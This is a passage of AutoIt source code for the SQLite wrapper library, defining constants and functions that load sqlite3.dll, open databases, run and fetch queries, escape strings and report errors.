#IgnoreFunc __SQLite_Inline_Version, __SQLite_Inline_Modified
Global Const $sqlite_ok = 0
Global Const $sqlite_error = 1
Global Const $sqlite_internal = 2
Global Const $sqlite_perm = 3
Global Const $sqlite_abort = 4
Global Const $sqlite_busy = 5
Global Const $sqlite_locked = 6
Global Const $sqlite_nomem = 7
Global Const $sqlite_readonly = 8
Global Const $sqlite_interrupt = 9
Global Const $sqlite_ioerr = 10
Global Const $sqlite_corrupt = 11
Global Const $sqlite_notfound = 12
Global Const $sqlite_full = 13
Global Const $sqlite_cantopen = 14
Global Const $sqlite_protocol = 15
Global Const $sqlite_empty = 16
Global Const $sqlite_schema = 17
Global Const $sqlite_toobig = 18
Global Const $sqlite_constraint = 19
Global Const $sqlite_mismatch = 20
Global Const $sqlite_misuse = 21
Global Const $sqlite_nolfs = 22
Global Const $sqlite_auth = 23
Global Const $sqlite_row = 100
Global Const $sqlite_done = 101
Global Const $sqlite_open_readonly = 1
Global Const $sqlite_open_readwrite = 2
Global Const $sqlite_open_create = 4
Global Const $sqlite_encoding_utf8 = 0
Global Const $sqlite_encoding_utf16 = 1
Global Const $sqlite_encoding_utf16be = 2
Global Const $sqlite_type_integer = 1
Global Const $sqlite_type_float = 2
Global Const $sqlite_type_text = 3
Global Const $sqlite_type_blob = 4
Global Const $sqlite_type_null = 5
Global $g_hdll_sqlite = 0
Global $g_hdb_sqlite = 0
Global $g_butf8errormsg_sqlite = False
Global $g_sprintcallback_sqlite = "__SQLite_ConsoleWrite"
Global $__gbsafemodestate_sqlite = True
Global $__ghdbs_sqlite[1] = [""]
Global $__ghquerys_sqlite[1] = [""]
Global $__ghmsvcrtdll_sqlite = 0
Global $__gatempfiles_sqlite[1] = [""]

Func _sqlite_startup($sdll_filename = "", $butf8errormsg = False, $bforcelocal = 0, $sprintcallback = $g_sprintcallback_sqlite)
	$g_sprintcallback_sqlite = $sprintcallback
	If IsKeyword($butf8errormsg) Then $butf8errormsg = False
	$g_butf8errormsg_sqlite = $butf8errormsg
	If IsKeyword($sdll_filename) OR $bforcelocal OR $sdll_filename = "" OR $sdll_filename = -1 Then
		Local $bdownloaddll = True
		Local $vinlineversion = Call("__SQLite_Inline_Version")
		If $bforcelocal Then
			If @AutoItX64 AND StringInStr($sdll_filename, "_x64") Then $sdll_filename = StringReplace($sdll_filename, ".dll", "_x64.dll")
			$bdownloaddll = ($bforcelocal < 0)
		Else
			If @AutoItX64 = 0 Then
				$sdll_filename = "sqlite3.dll"
			Else
				$sdll_filename = "sqlite3_x64.dll"
			EndIf
			If @error Then $bdownloaddll = False
			If __sqlite_verscmp(@ScriptDir & "\" & $sdll_filename, $vinlineversion) = $sqlite_ok Then
				$sdll_filename = @ScriptDir & "\" & $sdll_filename
				$bdownloaddll = False
			ElseIf __sqlite_verscmp(@SystemDir & "\" & $sdll_filename, $vinlineversion) = $sqlite_ok Then
				$sdll_filename = @SystemDir & "\" & $sdll_filename
				$bdownloaddll = False
			ElseIf __sqlite_verscmp(@WindowsDir & "\" & $sdll_filename, $vinlineversion) = $sqlite_ok Then
				$sdll_filename = @WindowsDir & "\" & $sdll_filename
				$bdownloaddll = False
			ElseIf __sqlite_verscmp(@WorkingDir & "\" & $sdll_filename, $vinlineversion) = $sqlite_ok Then
				$sdll_filename = @WorkingDir & "\" & $sdll_filename
				$bdownloaddll = False
			EndIf
		EndIf
		If $bdownloaddll Then
			If FileExists($sdll_filename) OR $sdll_filename = "" Then
				$sdll_filename = _tempfile(@TempDir, "~", ".dll")
				_arrayadd($__gatempfiles_sqlite, $sdll_filename)
				OnAutoItExitRegister("_SQLite_Shutdown")
			Else
				$sdll_filename = @SystemDir & "\" & $sdll_filename
			EndIf
			If $bforcelocal Then
				$vinlineversion = ""
			Else
				$vinlineversion = "_" & $vinlineversion
			EndIf
			__sqlite_download_sqlite3dll($sdll_filename, $vinlineversion)
		EndIf
	EndIf
	Local $hdll = DllOpen($sdll_filename)
	If $hdll = -1 Then
		$g_hdll_sqlite = 0
		Return SetError(1, 0, "")
	Else
		$g_hdll_sqlite = $hdll
		Return $sdll_filename
	EndIf
EndFunc

Func _sqlite_shutdown()
	If $g_hdll_sqlite > 0 Then DllClose($g_hdll_sqlite)
	$g_hdll_sqlite = 0
	If $__ghmsvcrtdll_sqlite > 0 Then DllClose($__ghmsvcrtdll_sqlite)
	$__ghmsvcrtdll_sqlite = 0
	For $stempfile In $__gatempfiles_sqlite
		If FileExists($stempfile) Then FileDelete($stempfile)
	Next
	OnAutoItExitUnRegister("_SQLite_Shutdown")
EndFunc

Func _sqlite_open($sdatabase_filename = Default, $iaccessmode = Default, $iencoding = Default)
	If NOT $g_hdll_sqlite Then Return SetError(3, $sqlite_misuse, 0)
	If IsKeyword($sdatabase_filename) OR NOT IsString($sdatabase_filename) Then $sdatabase_filename = ":memory:"
	Local $tfilename = __sqlite_stringtoutf8struct($sdatabase_filename)
	If @error Then Return SetError(2, @error, 0)
	If IsKeyword($iaccessmode) Then $iaccessmode = BitOR($sqlite_open_readwrite, $sqlite_open_create)
	Local $oldbase = FileExists($sdatabase_filename)
	If IsKeyword($iencoding) Then
		$iencoding = $sqlite_encoding_utf8
	EndIf
	Local $avrval = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_open_v2", "struct*", $tfilename, "long*", 0, "int", $iaccessmode, "ptr", 0)
	If @error Then Return SetError(1, @error, 0)
	If $avrval[0] <> $sqlite_ok Then
		__sqlite_reporterror($avrval[2], "_SQLite_Open")
		_sqlite_close($avrval[2])
		Return SetError(-1, $avrval[0], 0)
	EndIf
	$g_hdb_sqlite = $avrval[2]
	__sqlite_hadd($__ghdbs_sqlite, $avrval[2])
	If NOT $oldbase Then
		Local $encoding[3] = ["8", "16", "16be"]
		_sqlite_exec($avrval[2], 'PRAGMA encoding="UTF-' & $encoding[$iencoding] & '";')
	EndIf
	Return SetExtended($avrval[0], $avrval[2])
EndFunc

Func _sqlite_gettable($hdb, $ssql, ByRef $aresult, ByRef $irows, ByRef $icolumns, $icharsize = -1)
	$aresult = ""
	If __sqlite_hchk($hdb, 1) Then Return SetError(@error, 0, $sqlite_misuse)
	If $icharsize = "" OR $icharsize < 1 OR IsKeyword($icharsize) Then $icharsize = -1
	Local $hquery
	Local $r = _sqlite_query($hdb, $ssql, $hquery)
	If @error Then Return SetError(2, @error, $r)
	Local $adatarow
	$r = _sqlite_fetchnames($hquery, $adatarow)
	Local $err = @error
	If $err Then
		_sqlite_queryfinalize($hquery)
		Return SetError(3, $err, $r)
	EndIf
	$icolumns = UBound($adatarow)
	Local Const $irowsincr = 64
	$irows = 0
	Local $iallocrows = $irowsincr
	Dim $aresult[($iallocrows + 1) * $icolumns + 1]
	For $idx = 0 To $icolumns - 1
		If $icharsize > 0 Then
			$adatarow[$idx] = StringLeft($adatarow[$idx], $icharsize)
		EndIf
		$aresult[$idx + 1] = $adatarow[$idx]
	Next
	While 1
		$r = _sqlite_fetchdata($hquery, $adatarow, 0, 0, $icolumns)
		$err = @error
		Switch $r
			Case $sqlite_ok
				$irows += 1
				If $irows = $iallocrows Then
					$iallocrows = Round($iallocrows * 4 / 3)
					ReDim $aresult[($iallocrows + 1) * $icolumns + 1]
				EndIf
				For $j = 0 To $icolumns - 1
					If $icharsize > 0 Then
						$adatarow[$j] = StringLeft($adatarow[$j], $icharsize)
					EndIf
					$idx += 1
					$aresult[$idx] = $adatarow[$j]
				Next
			Case $sqlite_done
				ExitLoop
			Case Else
				$aresult = ""
				_sqlite_queryfinalize($hquery)
				Return SetError(4, $err, $r)
		EndSwitch
	WEnd
	$aresult[0] = ($irows + 1) * $icolumns
	ReDim $aresult[$aresult[0] + 1]
	Return ($sqlite_ok)
EndFunc

Func _sqlite_exec($hdb, $ssql, $scallback = "")
	If __sqlite_hchk($hdb, 2) Then Return SetError(@error, 0, $sqlite_misuse)
	If $scallback <> "" Then
		Local $irows, $icolumns
		Local $aresult = "SQLITE_CALLBACK:" & $scallback
		Local $irval = _sqlite_gettable2d($hdb, $ssql, $aresult, $irows, $icolumns)
		If @error Then Return SetError(3, @error, $irval)
		Return $irval
	EndIf
	Local $tsql8 = __sqlite_stringtoutf8struct($ssql)
	If @error Then Return SetError(4, @error, 0)
	Local $avrval = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_exec", "ptr", $hdb, "struct*", $tsql8, "ptr", 0, "ptr", 0, "long*", 0)
	If @error Then Return SetError(1, @error, $sqlite_misuse)
	__sqlite_szfree($avrval[5])
	If $avrval[0] <> $sqlite_ok Then
		__sqlite_reporterror($hdb, "_SQLite_Exec", $ssql)
		SetError(-1)
	EndIf
	Return $avrval[0]
EndFunc

Func _sqlite_libversion()
	If $g_hdll_sqlite = 0 Then Return SetError(1, $sqlite_misuse, 0)
	Local $r = DllCall($g_hdll_sqlite, "str:cdecl", "sqlite3_libversion")
	If @error Then Return SetError(1, @error, 0)
	Return $r[0]
EndFunc

Func _sqlite_lastinsertrowid($hdb = -1)
	If __sqlite_hchk($hdb, 2) Then Return SetError(@error, @extended, 0)
	Local $r = DllCall($g_hdll_sqlite, "long:cdecl", "sqlite3_last_insert_rowid", "ptr", $hdb)
	If @error Then Return SetError(1, @error, 0)
	Return $r[0]
EndFunc

Func _sqlite_changes($hdb = -1)
	If __sqlite_hchk($hdb, 2) Then Return SetError(@error, @extended, 0)
	Local $r = DllCall($g_hdll_sqlite, "long:cdecl", "sqlite3_changes", "ptr", $hdb)
	If @error Then Return SetError(1, @error, 0)
	Return $r[0]
EndFunc

Func _sqlite_totalchanges($hdb = -1)
	If __sqlite_hchk($hdb, 2) Then Return SetError(@error, @extended, 0)
	Local $r = DllCall($g_hdll_sqlite, "long:cdecl", "sqlite3_total_changes", "ptr", $hdb)
	If @error Then Return SetError(1, @error, 0)
	Return $r[0]
EndFunc

Func _sqlite_errcode($hdb = -1)
	If __sqlite_hchk($hdb, 2) Then Return SetError(@error, 0, $sqlite_misuse)
	Local $r = DllCall($g_hdll_sqlite, "long:cdecl", "sqlite3_errcode", "ptr", $hdb)
	If @error Then Return SetError(1, @error, $sqlite_misuse)
	Return $r[0]
EndFunc

Func _sqlite_errmsg($hdb = -1)
	If __sqlite_hchk($hdb, 2) Then Return SetError(@error, @extended, "Library used incorrectly")
	Local $r = DllCall($g_hdll_sqlite, "wstr:cdecl", "sqlite3_errmsg16", "ptr", $hdb)
	If @error Then
		__sqlite_reporterror($hdb, "_SQLite_ErrMsg", Default, "Call Failed")
		Return SetError(1, @error, "Library used incorrectly")
	EndIf
	Return $r[0]
EndFunc

Func _sqlite_display2dresult($aresult, $icellwidth = 0, $breturn = False)
	If NOT IsArray($aresult) OR UBound($aresult, 0) <> 2 OR $icellwidth < 0 Then Return SetError(1, 0, "")
	Local $aicellwidth
	If $icellwidth = 0 OR IsKeyword($icellwidth) Then
		Local $icellwidthmax
		Dim $aicellwidth[UBound($aresult, 2)]
		For $irow = 0 To UBound($aresult, 1) - 1
			For $icol = 0 To UBound($aresult, 2) - 1
				$icellwidthmax = StringLen($aresult[$irow][$icol])
				If $icellwidthmax > $aicellwidth[$icol] Then
					$aicellwidth[$icol] = $icellwidthmax
				EndIf
			Next
		Next
	EndIf
	Local $sout = "", $icellwidthused
	For $irow = 0 To UBound($aresult, 1) - 1
		For $icol = 0 To UBound($aresult, 2) - 1
			If $icellwidth = 0 Then
				$icellwidthused = $aicellwidth[$icol]
			Else
				$icellwidthused = $icellwidth
			EndIf
			$sout &= StringFormat(" %-" & $icellwidthused & "." & $icellwidthused & "s ", $aresult[$irow][$icol])
		Next
		$sout &= @CRLF
		If NOT $breturn Then
			__sqlite_print($sout)
			$sout = ""
		EndIf
	Next
	If $breturn Then Return $sout
EndFunc

Func _sqlite_gettable2d($hdb, $ssql, ByRef $aresult, ByRef $irows, ByRef $icolumns, $icharsize = -1, $fswichdimensions = False)
	If __sqlite_hchk($hdb, 1) Then Return SetError(@error, 0, $sqlite_misuse)
	If $icharsize = "" OR $icharsize < 1 OR IsKeyword($icharsize) Then $icharsize = -1
	Local $scallback = "", $fcallback = False
	If IsString($aresult) Then
		If StringLeft($aresult, 16) = "SQLITE_CALLBACK:" Then
			$scallback = StringTrimLeft($aresult, 16)
			$fcallback = True
		EndIf
	EndIf
	$aresult = ""
	If IsKeyword($fswichdimensions) Then $fswichdimensions = False
	Local $hquery
	Local $r = _sqlite_query($hdb, $ssql, $hquery)
	If @error Then Return SetError(2, @error, $r)
	If $r <> $sqlite_ok Then
		__sqlite_reporterror($hdb, "_SQLite_GetTable2d", $ssql)
		_sqlite_queryfinalize($hquery)
		Return SetError(-1, 0, $r)
	EndIf
	$irows = 0
	Local $irval_step, $err
	While True
		$irval_step = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_step", "ptr", $hquery)
		If @error Then
			$err = @error
			_sqlite_queryfinalize($hquery)
			Return SetError(3, $err, $sqlite_misuse)
		EndIf
		Switch $irval_step[0]
			Case $sqlite_row
				$irows += 1
			Case $sqlite_done
				ExitLoop
			Case Else
				_sqlite_queryfinalize($hquery)
				Return SetError(3, $err, $irval_step[0])
		EndSwitch
	WEnd
	Local $ret = _sqlite_queryreset($hquery)
	If @error Then
		$err = @error
		_sqlite_queryfinalize($hquery)
		Return SetError(4, $err, $ret)
	EndIf
	Local $adatarow
	$r = _sqlite_fetchnames($hquery, $adatarow)
	If @error Then
		$err = @error
		_sqlite_queryfinalize($hquery)
		Return SetError(5, $err, $r)
	EndIf
	$icolumns = UBound($adatarow)
	If $icolumns <= 0 Then
		_sqlite_queryfinalize($hquery)
		Return SetError(-1, 0, $sqlite_done)
	EndIf
	If NOT $fcallback Then
		If $fswichdimensions Then
			Dim $aresult[$icolumns][$irows + 1]
			For $i = 0 To $icolumns - 1
				If $icharsize > 0 Then
					$adatarow[$i] = StringLeft($adatarow[$i], $icharsize)
				EndIf
				$aresult[$i][0] = $adatarow[$i]
			Next
		Else
			Dim $aresult[$irows + 1][$icolumns]
			For $i = 0 To $icolumns - 1
				If $icharsize > 0 Then
					$adatarow[$i] = StringLeft($adatarow[$i], $icharsize)
				EndIf
				$aresult[0][$i] = $adatarow[$i]
			Next
		EndIf
	Else
		Local $icbrval
		$icbrval = Call($scallback, $adatarow)
		If $icbrval = $sqlite_abort OR $icbrval = $sqlite_interrupt OR @error Then
			$err = @error
			_sqlite_queryfinalize($hquery)
			Return SetError(7, $err, $icbrval)
		EndIf
	EndIf
	If $irows > 0 Then
		For $i = 1 To $irows
			$r = _sqlite_fetchdata($hquery, $adatarow, 0, 0, $icolumns)
			If @error Then
				$err = @error
				_sqlite_queryfinalize($hquery)
				Return SetError(6, $err, $r)
			EndIf
			If $fcallback Then
				$icbrval = Call($scallback, $adatarow)
				If $icbrval = $sqlite_abort OR $icbrval = $sqlite_interrupt OR @error Then
					$err = @error
					_sqlite_queryfinalize($hquery)
					Return SetError(7, $err, $icbrval)
				EndIf
			Else
				For $j = 0 To $icolumns - 1
					If $icharsize > 0 Then
						$adatarow[$j] = StringLeft($adatarow[$j], $icharsize)
					EndIf
					If $fswichdimensions Then
						$aresult[$j][$i] = $adatarow[$j]
					Else
						$aresult[$i][$j] = $adatarow[$j]
					EndIf
				Next
			EndIf
		Next
	EndIf
	Return (_sqlite_queryfinalize($hquery))
EndFunc

Func _sqlite_settimeout($hdb = -1, $itimeout = 1000)
	If __sqlite_hchk($hdb, 2) Then Return SetError(@error, 0, $sqlite_misuse)
	If IsKeyword($itimeout) Then $itimeout = 1000
	Local $avrval = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_busy_timeout", "ptr", $hdb, "int", $itimeout)
	If @error Then Return SetError(1, @error, $sqlite_misuse)
	If $avrval[0] <> $sqlite_ok Then SetError(-1)
	Return $avrval[0]
EndFunc

Func _sqlite_query($hdb, $ssql, ByRef $hquery)
	If __sqlite_hchk($hdb, 2) Then Return SetError(@error, 0, $sqlite_misuse)
	Local $irval = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_prepare16_v2", "ptr", $hdb, "wstr", $ssql, "int", -1, "long*", 0, "long*", 0)
	If @error Then Return SetError(1, @error, $sqlite_misuse)
	If $irval[0] <> $sqlite_ok Then
		__sqlite_reporterror($hdb, "_SQLite_Query", $ssql)
		Return SetError(-1, 0, $irval[0])
	EndIf
	$hquery = $irval[4]
	__sqlite_hadd($__ghquerys_sqlite, $irval[4])
	Return $irval[0]
EndFunc

Func _sqlite_fetchdata($hquery, ByRef $arow, $fbinary = False, $fdonotfinalize = False, $icolumns = 0)
	Dim $arow[1]
	If __sqlite_hchk($hquery, 7, False) Then Return SetError(@error, 0, $sqlite_misuse)
	If IsKeyword($fbinary) Then $fbinary = False
	If IsKeyword($fdonotfinalize) Then $fdonotfinalize = False
	Local $irval_step = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_step", "ptr", $hquery)
	If @error Then Return SetError(1, @error, $sqlite_misuse)
	If $irval_step[0] <> $sqlite_row Then
		If $fdonotfinalize = False AND $irval_step[0] = $sqlite_done Then
			_sqlite_queryfinalize($hquery)
		EndIf
		Return SetError(-1, 0, $irval_step[0])
	EndIf
	If NOT $icolumns Then
		Local $irval_colcnt = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_data_count", "ptr", $hquery)
		If @error Then Return SetError(2, @error, $sqlite_misuse)
		If $irval_colcnt[0] <= 0 Then Return SetError(-1, 0, $sqlite_done)
		$icolumns = $irval_colcnt[0]
	EndIf
	ReDim $arow[$icolumns]
	For $i = 0 To $icolumns - 1
		Local $irval_coltype = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_column_type", "ptr", $hquery, "int", $i)
		If @error Then Return SetError(4, @error, $sqlite_misuse)
		If $irval_coltype[0] = $sqlite_type_null Then
			$arow[$i] = ""
			ContinueLoop
		EndIf
		If (NOT $fbinary) AND ($irval_coltype[0] <> $sqlite_type_blob) Then
			Local $srval = DllCall($g_hdll_sqlite, "wstr:cdecl", "sqlite3_column_text16", "ptr", $hquery, "int", $i)
			If @error Then Return SetError(3, @error, $sqlite_misuse)
			$arow[$i] = $srval[0]
		Else
			Local $vresult = DllCall($g_hdll_sqlite, "ptr:cdecl", "sqlite3_column_blob", "ptr", $hquery, "int", $i)
			If @error Then Return SetError(6, @error, $sqlite_misuse)
			Local $icolbytes = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_column_bytes", "ptr", $hquery, "int", $i)
			If @error Then Return SetError(5, @error, $sqlite_misuse)
			Local $vresultstruct = DllStructCreate("byte[" & $icolbytes[0] & "]", $vresult[0])
			$arow[$i] = Binary(DllStructGetData($vresultstruct, 1))
		EndIf
	Next
	Return $sqlite_ok
EndFunc

Func _sqlite_close($hdb = -1)
	If __sqlite_hchk($hdb, 2) Then Return SetError(@error, 0, $sqlite_misuse)
	Local $irval = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_close", "ptr", $hdb)
	If @error Then Return SetError(1, @error, $sqlite_misuse)
	If $irval[0] <> $sqlite_ok Then
		__sqlite_reporterror($hdb, "_SQLite_Close")
		Return SetError(-1, 0, $irval[0])
	EndIf
	$g_hdb_sqlite = 0
	__sqlite_hdel($__ghdbs_sqlite, $hdb)
	Return $irval[0]
EndFunc

Func _sqlite_safemode($fsafemodestate)
	$__gbsafemodestate_sqlite = ($fsafemodestate = True)
	Return $sqlite_ok
EndFunc

Func _sqlite_queryfinalize($hquery)
	If __sqlite_hchk($hquery, 2, False) Then Return SetError(@error, 0, $sqlite_misuse)
	Local $avrval = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_finalize", "ptr", $hquery)
	If @error Then Return SetError(1, @error, $sqlite_misuse)
	__sqlite_hdel($__ghquerys_sqlite, $hquery)
	If $avrval[0] <> $sqlite_ok Then SetError(-1)
	Return $avrval[0]
EndFunc

Func _sqlite_queryreset($hquery)
	If __sqlite_hchk($hquery, 2, False) Then Return SetError(@error, 0, $sqlite_misuse)
	Local $avrval = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_reset", "ptr", $hquery)
	If @error Then Return SetError(1, @error, $sqlite_misuse)
	If $avrval[0] <> $sqlite_ok Then SetError(-1)
	Return $avrval[0]
EndFunc

Func _sqlite_fetchnames($hquery, ByRef $anames)
	Dim $anames[1]
	If __sqlite_hchk($hquery, 3, False) Then Return SetError(@error, 0, $sqlite_misuse)
	Local $avdatacnt = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_column_count", "ptr", $hquery)
	If @error Then Return SetError(1, @error, $sqlite_misuse)
	If $avdatacnt[0] <= 0 Then Return SetError(-1, 0, $sqlite_done)
	ReDim $anames[$avdatacnt[0]]
	Local $avcolname
	For $icnt = 0 To $avdatacnt[0] - 1
		$avcolname = DllCall($g_hdll_sqlite, "wstr:cdecl", "sqlite3_column_name16", "ptr", $hquery, "int", $icnt)
		If @error Then Return SetError(2, @error, $sqlite_misuse)
		$anames[$icnt] = $avcolname[0]
	Next
	Return $sqlite_ok
EndFunc

Func _sqlite_querysinglerow($hdb, $ssql, ByRef $arow)
	$arow = ""
	If __sqlite_hchk($hdb, 2) Then Return SetError(@error, 0, $sqlite_misuse)
	Local $hquery
	Local $irval = _sqlite_query($hdb, $ssql, $hquery)
	If @error Then
		_sqlite_queryfinalize($hquery)
		Return SetError(1, 0, $irval)
	Else
		$irval = _sqlite_fetchdata($hquery, $arow)
		If $irval = $sqlite_ok Then
			_sqlite_queryfinalize($hquery)
			If @error Then
				Return SetError(4, 0, $irval)
			Else
				Return $sqlite_ok
			EndIf
		Else
			_sqlite_queryfinalize($hquery)
			Return SetError(3, 0, $irval)
		EndIf
	EndIf
EndFunc

Func _sqlite_sqliteexe($sdatabasefile, $sinput, ByRef $soutput, $ssqliteexefilename = -1, $fdebug = False)
	If $ssqliteexefilename = -1 OR (IsKeyword($ssqliteexefilename) AND $ssqliteexefilename = Default) Then
		$ssqliteexefilename = "SQLite3.exe"
		If NOT FileExists($ssqliteexefilename) Then
			Local $atemp = StringSplit(@AutoItExe, "\")
			$ssqliteexefilename = ""
			For $i = 1 To $atemp[0] - 1
				$ssqliteexefilename &= $atemp[$i] & "\"
			Next
			$ssqliteexefilename &= "Extras\SQLite\SQLite3.exe"
		EndIf
	EndIf
	If NOT FileExists($sdatabasefile) Then
		Local $hnewfile = FileOpen($sdatabasefile, 2 + 8)
		If $hnewfile = -1 Then
			Return SetError(1, 0, $sqlite_cantopen)
		EndIf
		FileClose($hnewfile)
	EndIf
	Local $sinputfile = _tempfile(), $soutputfile = _tempfile(), $irval = $sqlite_ok
	Local $hinputfile = FileOpen($sinputfile, 2)
	If $hinputfile > -1 Then
		$sinput = ".output stdout" & @CRLF & $sinput
		FileWrite($hinputfile, $sinput)
		FileClose($hinputfile)
		Local $scmd = @ComSpec & " /c " & FileGetShortName($ssqliteexefilename) & '  "' & FileGetShortName($sdatabasefile) & '" > "' & FileGetShortName($soutputfile) & '" < "' & FileGetShortName($sinputfile) & '"'
		Local $nerrorlevel = RunWait($scmd, @WorkingDir, @SW_HIDE)
		If $fdebug = True Then
			Local $nerrortemp = @error
			__sqlite_print("@@ Debug(_SQLite_SQLiteExe) : $sCmd = " & $scmd & @CRLF & ">ErrorLevel: " & $nerrorlevel & @CRLF)
			SetError($nerrortemp)
		EndIf
		If @error = 1 OR $nerrorlevel = 1 Then
			$irval = $sqlite_misuse
		Else
			$soutput = FileRead($soutputfile, FileGetSize($soutputfile))
			If StringInStr($soutput, "SQL error:", 1) > 0 OR StringInStr($soutput, "Incomplete SQL:", 1) > 0 Then $irval = $sqlite_error
		EndIf
	Else
		$irval = $sqlite_cantopen
	EndIf
	If FileExists($sinputfile) Then FileDelete($sinputfile)
	Switch $irval
		Case $sqlite_misuse
			SetError(2)
		Case $sqlite_error
			SetError(3)
		Case $sqlite_cantopen
			SetError(4)
	EndSwitch
	Return $irval
EndFunc

Func _sqlite_encode($vdata)
	If IsNumber($vdata) Then $vdata = String($vdata)
	If NOT IsString($vdata) AND NOT IsBinary($vdata) Then Return SetError(1, 0, "")
	Local $vrval = "X'"
	If StringLower(StringLeft($vdata, 2)) = "0x" AND NOT IsBinary($vdata) Then
		For $icnt = 1 To StringLen($vdata)
			$vrval &= Hex(Asc(StringMid($vdata, $icnt, 1)), 2)
		Next
	Else
		If NOT IsBinary($vdata) Then $vdata = StringToBinary($vdata, 4)
		$vrval &= Hex($vdata)
	EndIf
	$vrval &= "'"
	Return $vrval
EndFunc

Func _sqlite_escape($sstring, $ibuffsize = Default)
	If $g_hdll_sqlite = 0 Then Return SetError(1, $sqlite_misuse, "")
	If IsNumber($sstring) Then $sstring = String($sstring)
	Local $tsql8 = __sqlite_stringtoutf8struct($sstring)
	If @error Then Return SetError(2, @error, 0)
	Local $arval = DllCall($g_hdll_sqlite, "ptr:cdecl", "sqlite3_mprintf", "str", "'%q'", "struct*", $tsql8)
	If @error Then Return SetError(1, @error, "")
	If IsKeyword($ibuffsize) OR $ibuffsize < 1 Then $ibuffsize = -1
	Local $sresult = __sqlite_szstringread($arval[0], $ibuffsize)
	If @error Then Return SetError(3, @error, "")
	DllCall($g_hdll_sqlite, "none:cdecl", "sqlite3_free", "ptr", $arval[0])
	Return $sresult
EndFunc

Func _sqlite_fastencode($vdata)
	If NOT IsBinary($vdata) Then Return SetError(1, 0, "")
	Return "X'" & Hex($vdata) & "'"
EndFunc

Func _sqlite_fastescape($sstring)
	If IsNumber($sstring) Then $sstring = String($sstring)
	If NOT IsString($sstring) Then Return SetError(1, 0, "")
	Return ("'" & StringReplace($sstring, "'", "''", 0, 1) & "'")
EndFunc

#Region		SQLite.au3 Internal Functions

	Func __sqlite_hchk(ByRef $hgeneric, $nerror, $bdb = True)
		If $g_hdll_sqlite = 0 Then Return SetError(1, $sqlite_misuse, $sqlite_misuse)
		If $hgeneric = -1 OR $hgeneric = "" OR IsKeyword($hgeneric) Then
			If NOT $bdb Then Return SetError($nerror, 0, $sqlite_error)
			$hgeneric = $g_hdb_sqlite
		EndIf
		If NOT $__gbsafemodestate_sqlite Then Return $sqlite_ok
		If $bdb Then
			If _arraysearch($__ghdbs_sqlite, $hgeneric) > 0 Then Return $sqlite_ok
		Else
			If _arraysearch($__ghquerys_sqlite, $hgeneric) > 0 Then Return $sqlite_ok
		EndIf
		Return SetError($nerror, 0, $sqlite_error)
	EndFunc

	Func __sqlite_hadd(ByRef $ahlists, $hgeneric)
		_arrayadd($ahlists, $hgeneric)
	EndFunc

	Func __sqlite_hdel(ByRef $ahlists, $hgeneric)
		Local $ielement = _arraysearch($ahlists, $hgeneric)
		If $ielement > 0 Then _arraydelete($ahlists, $ielement)
	EndFunc

	Func __sqlite_verscmp($sfile, $sversion)
		Local $avrval = DllCall($sfile, "str:cdecl", "sqlite3_libversion")
		If @error Then Return $sqlite_corrupt
		Local $szfileversion = StringSplit($avrval[0], ".")
		Local $maintversion = 0
		If $szfileversion[0] = 4 Then $maintversion = $szfileversion[4]
		$szfileversion = (($szfileversion[1] * 1000 + $szfileversion[2]) * 1000 + $szfileversion[3]) * 100 + $maintversion
		If $sversion < 10000000 Then $sversion = $sversion * 100
		If $szfileversion >= $sversion Then Return $sqlite_ok
		Return $sqlite_mismatch
	EndFunc

	Func __sqlite_hdbg()
		__sqlite_print("State : " & $__gbsafemodestate_sqlite & @CRLF)
		Local $atmp = $__ghdbs_sqlite
		For $i = 0 To UBound($atmp) - 1
			__sqlite_print("$__ghDBs_SQLite     -> [" & $i & "]" & $atmp[$i] & @CRLF)
		Next
		$atmp = $__ghquerys_sqlite
		For $i = 0 To UBound($atmp) - 1
			__sqlite_print("$__ghQuerys_SQLite  -> [" & $i & "]" & $atmp[$i] & @CRLF)
		Next
	EndFunc

	Func __sqlite_reporterror($hdb, $sfunction, $squery = Default, $serror = Default, $vreturnvalue = Default, $curerr = @error, $curext = @extended)
		If @Compiled Then Return SetError($curerr, $curext)
		If IsKeyword($serror) Then $serror = _sqlite_errmsg($hdb)
		If IsKeyword($squery) Then $squery = ""
		Local $sout = "!   SQLite.au3 Error" & @CRLF
		$sout &= "--> Function: " & $sfunction & @CRLF
		If $squery <> "" Then $sout &= "--> Query:    " & $squery & @CRLF
		$sout &= "--> Error:    " & $serror & @CRLF
		__sqlite_print($sout & @CRLF)
		If NOT IsKeyword($vreturnvalue) Then Return SetError($curerr, $curext, $vreturnvalue)
		Return SetError($curerr, $curext)
	EndFunc

	Func __sqlite_szstringread($iszptr, $imaxlen = -1)
		If $iszptr = 0 Then Return ""
		If $__ghmsvcrtdll_sqlite < 1 Then $__ghmsvcrtdll_sqlite = DllOpen("msvcrt.dll")
		Local $astrlen = DllCall($__ghmsvcrtdll_sqlite, "ulong_ptr:cdecl", "strlen", "ptr", $iszptr)
		If @error Then Return SetError(1, @error, "")
		Local $ilen = $astrlen[0] + 1
		Local $vszstring = DllStructCreate("byte[" & $ilen & "]", $iszptr)
		If @error Then Return SetError(2, @error, "")
		Local $err = 0
		Local $rtn = __sqlite_utf8structtostring($vszstring)
		If @error Then
			$err = 3
		EndIf
		If $imaxlen <= 0 Then
			Return SetError($err, @extended, $rtn)
		Else
			Return SetError($err, @extended, StringLeft($rtn, $imaxlen))
		EndIf
	EndFunc

	Func __sqlite_szfree($ptr, $curerr = @error)
		If $ptr <> 0 Then DllCall($g_hdll_sqlite, "none:cdecl", "sqlite3_free", "ptr", $ptr)
		SetError($curerr)
	EndFunc

	Func __sqlite_stringtoutf8struct($sstring)
		Local $aresult = DllCall("kernel32.dll", "int", "WideCharToMultiByte", "uint", 65001, "dword", 0, "wstr", $sstring, "int", -1, "ptr", 0, "int", 0, "ptr", 0, "ptr", 0)
		If @error Then Return SetError(1, @error, "")
		Local $ttext = DllStructCreate("char[" & $aresult[0] & "]")
